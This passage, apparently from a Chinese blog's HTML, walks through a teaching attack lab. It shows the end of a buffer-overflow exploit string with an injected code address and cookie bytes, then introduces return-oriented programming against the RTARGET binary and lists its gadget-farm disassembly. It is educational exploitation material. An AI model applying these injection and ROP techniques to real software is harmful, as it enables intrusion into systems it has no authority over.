+</span></span><span class="line"><span class="cl"><span class="o">****</span><span class="mi">08</span> <span class="mi">49</span> <span class="mi">65</span> <span class="mi">55</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// 攻击代码的首地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">32</span> <span class="mi">64</span> <span class="mi">65</span> <span class="mi">64</span> <span class="mi">39</span> <span class="mi">64</span> <span class="mi">63</span> <span class="mi">30</span>  <span class="c1">// cookie的ASCII码字节值（小端）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span>                       <span class="c1">// 字符串末尾要跟上一个`\0`字符
+</span></span></span></code></pre></div><p>运行，任务完成。</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/42ece82e-0a85-4809-985a-c56eb7f64be9/%E6%88%AA%E5%B1%8F2023-12-10_23.02.41.png" alt="截屏2023-12-10 23.02.41.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<hr>
+<h2 id="part-ii--return-oriented-programming">Part II : <strong>Return-Oriented Programming</strong></h2>
+<p>第二部分将攻击程序<strong>RTARGET</strong>，但对其代码注入要难一些，它采用了以下两种技术对抗攻击：</p>
+<ul>
+<li>栈随机化，每次运行栈的位置都不同，因而无法决定你的攻击代码代码应该注入哪里。</li>
+<li>将保存栈的内存区域设置为不可执行，所以即使你能把注入的代码的起始地址放到程序计数器中，程序也会报段错误失败。</li>
+</ul>
+<p>幸运的是，聪明的人们设计了一些策略，通过执行现有程序中的代码来做他们期望的事情，而不是注入新的代码。这种方法称为<strong>面向返回的编程（ROP）</strong>。</p>
+<blockquote>
+<p><em>The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret.</em>
+在已有的程序中找到特定的以<code>ret</code>结尾的指令序列，称这样的代码段为<strong>gadget</strong>；
+****把要用到部分的地址压入栈中，每次<code>ret</code>后又会取出一个新的<strong>gadget，进而</strong>形成一个程序链。</p></blockquote>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/64d648ab-b8f8-4e9a-b937-468647b7c92e/Untitled.png" alt="Untitled" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>举例而言，rtarget可能包含下面这个函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0000000000400</span><span class="nf">f15</span> <span class="o">&lt;</span><span class="nv">setval_210</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">400</span><span class="nl">f15:</span><span class="err">      </span> <span class="nf">c7</span> <span class="mi">07</span> <span class="nv">d4</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">c7</span><span class="err">      </span> <span class="nv">movl</span><span class="err">  </span> <span class="kc">$</span><span class="mh">0xc78948d4</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">400</span><span class="nl">f1b:</span><span class="err">      </span> <span class="nf">c3</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nv">retq</span>
+</span></span></code></pre></div><p>这个函数本无害，但其末尾的字节序列<code>48 49 c7</code>是指令<code>movq %rax, %rdi</code>的编码。</p>
+<p>因此，我们可以通过将执行的地址定在<code>0x400f18</code>而不是<code>0x400f15</code>，来让程序执行命令<code>movq %rax, %rdi</code>。</p>
+<p>由此，我们的攻击代码将由一系列这样的函数组成，称为<strong>gadget farm</strong>。</p>
+<ul>
+<li>
+<p><strong>gadget farm</strong>函数组 （RTARGET文件中）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0000000000401900</span> <span class="err">&lt;</span><span class="nf">start_farm</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401900:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401905:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401906</span> <span class="err">&lt;</span><span class="nf">setval_175</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401906:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">c7</span> <span class="nv">c2</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc2c78948</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40190</span><span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040190</span><span class="nf">d</span> <span class="o">&lt;</span><span class="nv">setval_284</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40190</span><span class="nl">d:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">79</span> <span class="mi">46</span> <span class="mi">78</span> <span class="nv">c3</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc3784679</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401913:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401914</span> <span class="err">&lt;</span><span class="nf">setval_312</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401914:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="nv">d8</span> <span class="nv">c3</span> <span class="nv">cc</span> <span class="mi">3</span><span class="nv">f</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x3fccc3d8</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40191</span><span class="nl">a:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040191</span><span class="nf">b</span> <span class="o">&lt;</span><span class="nv">getval_382</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40191</span><span class="nl">b:</span>	<span class="nf">b8</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">c7</span> <span class="mi">90</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x90c78948</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401920:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401921</span> <span class="err">&lt;</span><span class="nf">getval_109</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401921:</span>	<span class="nf">b8</span> <span class="mi">29</span> <span class="mi">58</span> <span class="mi">90</span> <span class="nv">c3</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc3905829</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401926:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401927</span> <span class="err">&lt;</span><span class="nf">addval_195</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401927:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">c7</span> <span class="nv">c7</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x383876b8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40192</span><span class="nl">d:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040192</span><span class="nf">e</span> <span class="o">&lt;</span><span class="nv">getval_135</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40192</span><span class="nl">e:</span>	<span class="nf">b8</span> <span class="mi">58</span> <span class="mi">90</span> <span class="mi">90</span> <span class="nv">c3</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc3909058</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401933:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401934</span> <span class="err">&lt;</span><span class="nf">setval_438</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401934:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">3</span><span class="nv">a</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">c7</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc789483a</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40193</span><span class="nl">a:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040193</span><span class="nf">b</span> <span class="o">&lt;</span><span class="nv">mid_farm</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40193</span><span class="nl">b:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401940:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401941</span> <span class="err">&lt;</span><span class="nf">add_xy</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401941:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">04</span> <span class="mi">37</span>          	<span class="nv">lea</span>    <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="nb">rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401945:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401946</span> <span class="err">&lt;</span><span class="nf">getval_327</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401946:</span>	<span class="nf">b8</span> <span class="mi">81</span> <span class="nv">d6</span> <span class="mi">20</span> <span class="nv">db</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xdb20d681</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40194</span><span class="nl">b:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040194</span><span class="nf">c</span> <span class="o">&lt;</span><span class="nv">setval_127</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40194</span><span class="nl">c:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="nv">d6</span> <span class="mi">90</span> <span class="nv">c3</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc390d689</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401952:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401953</span> <span class="err">&lt;</span><span class="nf">getval_156</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401953:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="nv">c1</span> <span class="mi">94</span> <span class="mi">90</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x9094c189</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401958:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401959</span> <span class="err">&lt;</span><span class="nf">setval_410</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401959:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">94</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x94e08948</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40195</span><span class="nl">f:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401960</span> <span class="err">&lt;</span><span class="nf">getval_330</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401960:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="nv">c1</span> <span class="mi">84</span> <span class="nv">c0</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc084c189</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401965:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401966</span> <span class="err">&lt;</span><span class="nf">setval_277</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401966:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="nv">af</span> <span class="mi">48</span> <span class="mi">99</span> <span class="nv">e0</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xe09948af</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40196</span><span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040196</span><span class="nf">d</span> <span class="o">&lt;</span><span class="nv">setval_155</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40196</span><span class="nl">d:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">88</span> <span class="nv">c1</span> <span class="mi">20</span> <span class="nv">db</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xdb20c188</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401973:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401974</span> <span class="err">&lt;</span><span class="nf">addval_275</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401974:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">88</span> <span class="nv">ca</span> <span class="mi">38</span> <span class="nv">db</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x24c73578</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40197</span><span class="nl">a:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040197</span><span class="nf">b</span> <span class="o">&lt;</span><span class="nv">addval_418</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40197</span><span class="nl">b:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">15</span> <span class="mi">89</span> <span class="nv">ca</span> <span class="nv">c2</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x3d3576eb</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401981:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401982</span> <span class="err">&lt;</span><span class="nf">getval_313</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401982:</span>	<span class="nf">b8</span> <span class="mi">8</span><span class="nv">b</span> <span class="nv">c1</span> <span class="mi">90</span> <span class="nv">c3</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc390c18b</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401987:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401988</span> <span class="err">&lt;</span><span class="nf">getval_427</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401988:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="nv">ca</span> <span class="mi">94</span> <span class="nv">c9</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc994ca89</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40198</span><span class="nl">d:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040198</span><span class="nf">e</span> <span class="o">&lt;</span><span class="nv">getval_258</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40198</span><span class="nl">e:</span>	<span class="nf">b8</span> <span class="nv">a9</span> <span class="nv">ca</span> <span class="mi">38</span> <span class="nv">d2</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xd238caa9</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401993:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401994</span> <span class="err">&lt;</span><span class="nf">setval_461</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401994:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="nv">c1</span> <span class="nv">a4</span> <span class="nv">c0</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc0a4c189</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40199</span><span class="nl">a:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">000000000040199</span><span class="nf">b</span> <span class="o">&lt;</span><span class="nv">addval_154</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40199</span><span class="nl">b:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">92</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x6d1f76b8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">a1:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">a2</span> <span class="o">&lt;</span><span class="nv">getval_363</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">a2:</span>	<span class="nf">b8</span> <span class="nv">eb</span> <span class="mi">92</span> <span class="nv">c9</span> <span class="nv">d6</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xd6c992eb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">a7:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">a8</span> <span class="o">&lt;</span><span class="nv">addval_293</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">a8:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">8</span><span class="nv">b</span> <span class="nv">c1</span> <span class="mi">20</span> <span class="nv">db</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x24df3e75</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ae:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">af</span> <span class="o">&lt;</span><span class="nv">addval_497</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">af:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">90</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x6f1f76b8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">b5:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">b6</span> <span class="o">&lt;</span><span class="nv">getval_339</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">b6:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="nv">ca</span> <span class="mi">84</span> <span class="nv">c0</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc084ca89</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">bb:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">bc</span> <span class="o">&lt;</span><span class="nv">setval_376</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">bc:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="nv">c1</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc1e08948</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">c2:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">c3</span> <span class="o">&lt;</span><span class="nv">addval_477</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">c3:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">91</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x6e1f76b8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">c9:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">ca</span> <span class="o">&lt;</span><span class="nv">getval_393</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ca:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="nv">c1</span> <span class="mi">38</span> <span class="nv">c0</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc038c189</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">cf:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">d0</span> <span class="o">&lt;</span><span class="nv">getval_360</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">d0:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="nv">d6</span> <span class="mi">48</span> <span class="nv">db</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xdb48d689</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">d5:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">d6</span> <span class="o">&lt;</span><span class="nv">addval_301</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">d6:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">81</span> <span class="nv">d6</span> <span class="mi">84</span> <span class="nv">db</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x247b297f</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">dc:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="kd">dd</span> <span class="o">&lt;</span><span class="nv">setval_119</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">dd:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="nv">d6</span> <span class="mi">28</span> <span class="nv">d2</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xd228d689</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">e3:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">e4</span> <span class="o">&lt;</span><span class="nv">getval_493</span><span class="o">&gt;</span><span class="p">:</span>
